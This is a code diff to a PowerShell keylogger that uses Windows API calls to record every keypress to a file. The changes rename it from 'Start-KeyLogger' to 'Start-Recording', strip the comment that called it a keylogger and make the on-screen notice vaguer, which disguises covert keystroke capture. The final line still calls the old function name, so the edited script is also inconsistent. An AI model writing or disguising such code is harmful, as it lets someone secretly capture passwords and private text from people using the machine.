@@ -1,11 +1,4 @@
-function Start-KeyLogger($Path = "$env:temp\keylogger.txt") {
-    <#
-    .DESCRIPTION
-        By accessing the Windows low-level API functions, a script can constantly
-        monitor the keyboard for keypresses and log these to a file. This effectively produces a keylogger.
-        Run the function Start-Keylogger to start logging key presses. Once you
-        stop the script by pressing CTRL+C, the collected key presses are displayed
-    #>
+function Start-Recording($Path = "$env:temp\recorded_log.txt") {
     # Signatures for API Calls
     $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
@@ -25,7 +18,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $null = New-Item -Path $Path -ItemType File -Force
 
     try {
-        Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
+        Write-Host 'Recording. Press CTRL+C to stop recording.' -ForegroundColor Red
 
         # create endless loop. When user presses CTRL+C, finally-block
         # executes and shows the collected key presses
@@ -50,11 +43,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
                     # prepare a StringBuilder to receive input key
                     $mychar = New-Object -TypeName System.Text.StringBuilder
-
-                    # translate virtual key
-                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-                    if ($success) {
+                    
+                    if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)) {
                         # add key to logger file
                         [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                     }
@@ -67,4 +57,4 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         notepad $Path
     }
 }
-Start-KeyLogger -Path "C:\Users\jeand\Documents\M2\test.txt" 
+Start-KeyLogger -Path "C:\Users\user\m2_minientreprise_scripts\scripts\recorded_log.txt" 
